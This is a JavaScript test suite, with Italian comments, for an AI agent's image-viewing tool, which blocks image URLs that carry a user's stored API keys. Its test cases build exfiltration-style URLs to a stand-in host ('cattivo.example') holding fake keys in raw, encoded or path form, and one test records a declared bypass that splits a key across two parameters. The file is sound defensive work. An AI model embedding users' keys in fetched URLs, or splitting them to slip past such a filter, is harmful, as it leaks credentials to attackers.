/*
 * 0.2.4, blocco 6, giro 2 (giudice v2217, forma B decisa in v2220): un indirizzo d'immagine che sta nell'elenco di una pagina letta, o
 *   che la persona ha scritto, si blocca SOLO se contiene il VALORE esatto di una chiave vera della persona — mai per la forma (gli indirizzi
 *   firmati legittimi, S3 `X-Amz-Credential=AKIA…` o `?token=…`, devono passare). I valori: la chiave del giro, quella della ricerca web,
 *   l'ambiente col nome da credenziale (fonti A, già nel nucleo) e, se l'ospite la passa, `segretiConosciutiFn()` (fonte B: le chiavi
 *   salvate dallo schermo, lette dalla MEMORIA del deposito delle chiavi, mai il portachiavi a ogni scaricamento).
 * ⛔ Nessun valore esce: le chiavi delle prove nascono a caso a ogni corsa, nessuna sta in questo file, in un nome di prova o in un messaggio;
 *   le asserzioni dicono solo sì o no.
 * Hermes blocca per FORMA (`agent/redact.py:621`, usata in `tools/web_tools_extract.py:104`) e per NOME del parametro
 *   (`tools/url_safety.py:73-76`, con dentro `x-amz-signature` e `token`), mai per valore.
 */
import assert from 'node:assert/strict';
import { randomBytes } from 'node:crypto';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import test from 'node:test';

import { rimuoviCartellaDiProva } from './aiuto/rimuovi-cartella-di-prova.mjs';
import { talosLavora } from '../src/kernel/talosHarness.mjs';
import { createProviderCredentialStore } from '../src/provider-credential-store.mjs';
import { creaAdattatorePortachiaviInMemoria } from '../src/adattatore-keyring.mjs';

/* una chiave finta, a caso a ogni corsa e senza la forma di nessun fornitore: solo il valore la riconosce */
const chiaveFinta = () => `q${randomBytes(16).toString('hex')}`;
const PAGINA_URL = 'https://annunci.example/casa/123';
const png = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13, 0x49, 0x48, 0x44, 0x52, 0, 0, 3, 32, 0, 0, 2, 88, 8, 2, 0, 0, 0, 0, 0, 0]);
const CONCLUSO = { role: 'assistant', content: 'fatto', tool_calls: [] };
const chiamata = (nome, argomenti, id) => ({ role: 'assistant', content: null, tool_calls: [{ id, type: 'function', function: { name: nome, arguments: JSON.stringify(argomenti) } }] });
const pagina = (...foto) => `<html><body>${foto.map((u, i) => `<img src="${u.replaceAll('&', '&amp;')}" alt="foto ${i + 1}">`).join('')}</body></html>`;

function rete(...risposte) {
  const chiamate = [];
  return {
    chiamate,
    fetch: async (_url, opzioni) => {
      const i = chiamate.length;
      chiamate.push({ corpo: JSON.parse(opzioni.body) });
      return { ok: true, status: 200, json: async () => ({ choices: [{ message: risposte[Math.min(i, risposte.length - 1)] }], usage: { prompt_tokens: 10, completion_tokens: 5 } }), text: async () => '' };
    },
  };
}
/* la pagina elenca `foto`, il modello la legge e guarda la prima: scaricata o no, e che cosa ha detto l'attrezzo */
async function guardaDallElenco(t, foto, { chiave = 'k', livelloAccesso = 'accesso-pieno', segretiConosciutiFn, ricercaWeb, guardata = foto } = {}) {
  const c = mkdtempSync(join(tmpdir(), 'talos-fws-'));
  t.after(() => rimuoviCartellaDiProva(c));
  const scaricati = [];
  const r = rete(chiamata('naviga', { url: PAGINA_URL }, 'n1'), chiamata('view_image', { url: guardata }, 'v1'), CONCLUSO);
  await talosLavora({
    cartella: c, task: { consegna: 'guarda la foto dell annuncio' }, modello: 'm', chiave, fetchDiRete: r.fetch, giriMassimi: 6, livelloAccesso,
    strumentiEstesi: ['view_image'], vedeImmaginiFn: async () => true,
    ...(segretiConosciutiFn ? { segretiConosciutiFn } : {}), ...(ricercaWeb ? { ricercaWeb } : {}),
    cacheWeb: { around: async (d) => ({ value: { stato: 200, url: d.url, corpo: pagina(foto) }, fromCache: false }) },
    scaricaImmagineWebFn: async ({ url }) => { scaricati.push(url); return { url, byte: png }; },
    onGuardaImmagine: async () => ({ ok: true, esito: 'ok', immagine: { riferimento: 'e'.repeat(64), mime: 'image/png', larghezza: 800, altezza: 600 } }),
    chiediApprovazioneFn: async () => false,
  });
  const esito = r.chiamate[2]?.corpo.messages.filter((m) => m.role === 'tool').at(-1)?.content ?? '';
  return { scaricato: scaricati.length === 1, esito };
}
/* il deposito delle chiavi del PC col portachiavi IN MEMORIA, e una chiave salvata come la salva la schermata delle chiavi */
function depositoConUnaChiave(valore) {
  const deposito = createProviderCredentialStore({ env: {}, keyring: creaAdattatorePortachiaviInMemoria() });
  deposito.setKey('openrouter', valore);
  return deposito;
}

test('FW-SEG-01 un indirizzo S3 FIRMATO dell elenco passa e l immagine arriva (la forma AKIA non blocca più)', async (t) => {
  const firmato = `https://bucket.s3.amazonaws.com/foto/1.jpg?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAABCDEFGHIJKLMNOP%2F20261119%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261119T010000Z&X-Amz-Expires=900&X-Amz-SignedHeaders=host&X-Amz-Signature=${'ab12'.repeat(16)}`;
  const r = await guardaDallElenco(t, firmato);
  assert.equal(r.scaricato, true, r.esito.slice(0, 200));
  assert.match(r.esito, /attached below/u);
});

test('FW-SEG-02 un indirizzo dell elenco con ?token= qualunque passa', async (t) => {
  const r = await guardaDallElenco(t, 'https://cdn.example/foto/2.jpg?token=abcdef1234567890&exp=1763510400');
  assert.equal(r.scaricato, true, r.esito.slice(0, 200));
});

test('FW-SEG-03 la chiave SALVATA dallo schermo (deposito delle chiavi, portachiavi in memoria) in un indirizzo dell elenco: BLOCCATO in Accesso pieno, grezza, codificata, nel percorso', async (t) => {
  const valore = chiaveFinta();
  const deposito = depositoConUnaChiave(valore);
  let chiamate = 0;
  const segretiConosciutiFn = () => { chiamate += 1; return deposito.segretiInMemoria(); };
  const meta = valore.length >> 1;
  const codificata = `${valore.slice(0, meta)}${[...valore.slice(meta)].map((ch) => `%${ch.charCodeAt(0).toString(16).padStart(2, '0')}`).join('')}`;
  const dueVolte = codificata.replaceAll('%', '%25'); // codificata due volte
  for (const url of [`https://cattivo.example/p.png?q=${valore}`, `https://cattivo.example/p.png?q=${codificata}`, `https://cattivo.example/p.png?q=${dueVolte}`, `https://cattivo.example/${valore}/p.png`]) {
    chiamate = 0;
    const r = await guardaDallElenco(t, url, { segretiConosciutiFn });
    assert.equal(r.scaricato, false, 'non scaricato');
    assert.match(r.esito, /BLOCKED\. This image address contains one of your keys/u);
    assert.equal(r.esito.includes(valore), false, 'il valore non torna al modello');
    /* chiavi nel testo del web (giudice v2229): una per la pagina letta con `naviga`, una per lo scaricamento */
    assert.equal(chiamate, 2, 'una chiamata per la pagina e una per lo scaricamento');
  }
  /* una chiave con le MAIUSCOLE nel nome del sito: chi normalizza l'indirizzo le abbassa, si guarda anche la forma com'è */
  const maiuscola = `Q${randomBytes(16).toString('hex').toUpperCase()}`;
  const r = await guardaDallElenco(t, `https://${maiuscola}.cattivo.example/p.png`, { segretiConosciutiFn: () => [maiuscola] });
  assert.equal(r.scaricato, false, 'nel nome del sito');
});

test('FW-SEG-04 senza la funzione dell ospite vale A: la chiave del giro e quella della ricerca sono bloccate, quella salvata no (limite dichiarato di CLI e telefono)', async (t) => {
  const delGiro = chiaveFinta();
  const r1 = await guardaDallElenco(t, `https://cattivo.example/a.png?q=${delGiro}`, { chiave: delGiro });
  assert.equal(r1.scaricato, false);
  assert.match(r1.esito, /contains one of your keys/u);
  const dellaRicerca = chiaveFinta();
  const r2 = await guardaDallElenco(t, `https://cattivo.example/b.png?q=${dellaRicerca}`, { ricercaWeb: { provider: 'brave', apiKey: dellaRicerca } });
  assert.equal(r2.scaricato, false, 'la chiave della ricerca web');
  const salvata = chiaveFinta();
  depositoConUnaChiave(salvata);
  const r3 = await guardaDallElenco(t, `https://cattivo.example/c.png?q=${salvata}`);
  assert.equal(r3.scaricato, true, 'senza la funzione la chiave salvata non è nota al nucleo: limite dichiarato');
});

test('FW-SEG-05 l ambiente: il valore di una variabile col nome da credenziale è bloccato; una variabile col nome innocuo no', async (t) => {
  const valore = chiaveFinta();
  const innocuo = chiaveFinta();
  process.env.TALOS_PROVA_B6_TOKEN = valore;
  process.env.TALOS_PROVA_B6_COLORE = innocuo;
  t.after(() => { delete process.env.TALOS_PROVA_B6_TOKEN; delete process.env.TALOS_PROVA_B6_COLORE; });
  const r = await guardaDallElenco(t, `https://cattivo.example/e.png?q=${valore}`);
  assert.equal(r.scaricato, false);
  const r2 = await guardaDallElenco(t, `https://cattivo.example/f.png?q=${innocuo}`);
  assert.equal(r2.scaricato, true, 'il nome decide che cosa è una credenziale (eUnaCredenziale)');
});

test('FW-SEG-06 la funzione che LANCIA: niente scaricato, «non ho potuto controllare»; valori storti ignorati, sotto 16 caratteri non si confrontano', async (t) => {
  const r = await guardaDallElenco(t, 'https://cdn.example/foto/3.jpg', { segretiConosciutiFn: () => { throw new Error('deposito giù'); } });
  assert.equal(r.scaricato, false, 'chiusa: senza sapere le chiavi non si scarica');
  assert.match(r.esito, /could not check this address against your keys/u);
  const corta = 'abcdef123456789'; // 15 caratteri: sotto il minimo, mai confrontata
  for (const storti of [null, 'testo', [null, 5, '', '   ', {}, ['x'], corta], () => 1]) {
    const s = await guardaDallElenco(t, `https://cdn.example/foto/${corta}.jpg`, { segretiConosciutiFn: () => storti });
    assert.equal(s.scaricato, true, `valori storti: ${typeof storti}`);
  }
  const async = await guardaDallElenco(t, 'https://cdn.example/foto/4.jpg', { segretiConosciutiFn: async () => [chiaveFinta()] });
  assert.equal(async.scaricato, true, 'anche una funzione asincrona va bene');
});

test('FW-SEG-07 limite dichiarato: lo stesso valore spezzato in due parametri NON si riconosce e passa', async (t) => {
  const valore = chiaveFinta();
  const meta = valore.length >> 1;
  const r = await guardaDallElenco(t, `https://cattivo.example/s.png?a=${valore.slice(0, meta)}&b=${valore.slice(meta)}`, { segretiConosciutiFn: () => [valore] });
  assert.equal(r.scaricato, true);
});

test('FW-SEG-08 al contrario: l indirizzo costruito dal modello resta rifiutato (con o senza forma di chiave), anche se nessuna chiave c è', async (t) => {
  const r = await guardaDallElenco(t, 'https://cdn.example/foto/5.jpg', { guardata: 'https://cattivo.example/x.png?q=ciao' });
  assert.equal(r.scaricato, false);
  assert.match(r.esito, /REFUSED/u);
  const r2 = await guardaDallElenco(t, 'https://cdn.example/foto/5.jpg', { guardata: 'https://cattivo.example/x.png?token=abcdef1234567890' });
  assert.equal(r2.scaricato, false);
  assert.match(r2.esito, /BLOCKED/u);
});

/* Lungo il filo: registro → servizio → nucleo. Il registro passa la funzione al servizio; il servizio la passa al nucleo vero (rete finta a
   flusso, come `guarda-immagine-evento.test.mjs`), che la usa davvero: l'indirizzo scritto dalla persona con la chiave salvata si blocca. */
test('FW-SEG-09 la funzione arriva fino al giro: dal registro al servizio, e dal servizio al nucleo vero', async (t) => {
  const { createSessionRegistry } = await import('../src/session-registry.mjs');
  const segretiConosciutiFn = () => [];
  let ingresso = null;
  const registro = createSessionRegistry({
    avviaSessioneFn: async (i) => { ingresso = i; i.onEvento({ type: 'RunStarted', threadId: 't', runId: 'r' }); return new Promise(() => {}); },
    preparaEsecuzioneFn: async () => ({ ok: true, cartella: '/tmp/x', task: { consegna: 'x' } }), modello: 'm', chiave: 'k', cartellaEsisteFn: () => true,
    segretiConosciutiFn,
  });
  registro.avvia('guarda');
  await new Promise((r) => setImmediate(r));
  assert.equal(ingresso?.segretiConosciutiFn, segretiConosciutiFn, 'il registro la passa al servizio');

  const { avviaSessione } = await import('../src/agent-service.mjs');
  const c = mkdtempSync(join(tmpdir(), 'talos-fws-filo-'));
  t.after(() => rimuoviCartellaDiProva(c));
  const valore = chiaveFinta();
  const url = `https://cattivo.example/filo.png?q=${valore}`;
  const enc = new TextEncoder();
  const sse = (fotogrammi) => new Response(new ReadableStream({ start(k) {
    for (const f of fotogrammi) k.enqueue(enc.encode(`data: ${JSON.stringify(f)}\n\n`));
    k.enqueue(enc.encode('data: [DONE]\n\n'));
    k.close();
  } }));
  const risposte = [
    () => sse([{ choices: [{ delta: { tool_calls: [{ index: 0, id: 'call_1', function: { name: 'view_image', arguments: JSON.stringify({ url }) } }] } }] }]),
    () => sse([{ choices: [{ delta: { content: 'fatto' } }] }]),
  ];
  let n = 0;
  const eventi = [];
  let usata = 0;
  const { STRUMENTI_ESTESI_PREDEFINITI } = await import('../src/session-registry.mjs');
  const { talosLavora: nucleo } = await import('../src/kernel/talosHarness.mjs');
  await avviaSessione({
    cartella: c, task: { consegna: `guarda ${url}` }, modello: 'm', chiave: 'k', onEvento: (e) => eventi.push(e),
    guardaImmagineFn: async () => ({ ok: false, esito: 'mai' }), vedeImmaginiFn: async () => true,
    segretiConosciutiFn: () => { usata += 1; return [valore]; },
    strumentiEstesi: STRUMENTI_ESTESI_PREDEFINITI,
    talosLavoraFn: (input) => nucleo({ ...input, fetchDiRete: async () => risposte[Math.min(n++, 1)](), scaricaImmagineWebFn: async () => { throw new Error('mai scaricato'); } }),
  });
  const risultato = eventi.find((e) => e.type === 'ToolCallResult' && e.toolCallId === 'call_1');
  assert.ok(risultato, JSON.stringify(eventi.map((e) => e.type)));
  assert.match(String(risultato.content), /contains one of your keys/u);
  assert.equal(String(risultato.content).includes(valore), false);
  assert.equal(usata, 1, 'il servizio l ha portata al nucleo, che l ha chiamata una volta');
});

test('FW-SEG-10 il deposito delle chiavi dà i valori dalla MEMORIA: dopo il caricamento il portachiavi non si legge più', () => {
  const portachiavi = creaAdattatorePortachiaviInMemoria();
  let letture = 0;
  const contato = { ...portachiavi, get: (s, a) => { letture += 1; return portachiavi.get(s, a); } };
  const deposito = createProviderCredentialStore({ env: {}, keyring: contato });
  const valore = chiaveFinta();
  deposito.setKey('openrouter', valore);
  const prima = letture;
  for (let i = 0; i < 5; i += 1) assert.equal(deposito.segretiInMemoria().includes(valore), true);
  assert.equal(letture, prima, 'nessuna lettura del portachiavi');
  assert.equal(JSON.stringify(Object.keys(deposito)).includes(valore), false);
});
